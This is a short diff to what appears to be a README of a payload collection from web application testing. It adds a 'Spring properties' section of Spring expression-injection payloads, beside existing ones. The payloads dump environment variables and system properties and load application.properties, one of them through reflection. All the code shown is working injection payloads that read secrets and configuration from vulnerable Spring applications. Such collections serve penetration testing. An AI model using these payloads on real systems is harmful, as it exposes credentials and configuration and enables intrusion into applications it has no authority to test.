@@ -17,6 +17,10 @@ So, this repository was born from payloads developed during a regular web applic
 ```Java
 T(java.lang.System).getenv().toString()
 T(java.lang.System).getProperties().toString()
+```
+## Spring properties
+```Java
+T(org.springframework.core.io.support.PropertiesLoaderUtils).loadAllProperties("application.properties").toString()
 "".getClass().forName("org.springframework.core.io.support.PropertiesLoaderUtils").getMethod("loadAllProperties","".getClass()).invoke("","application.properties").toString()
 ```
 
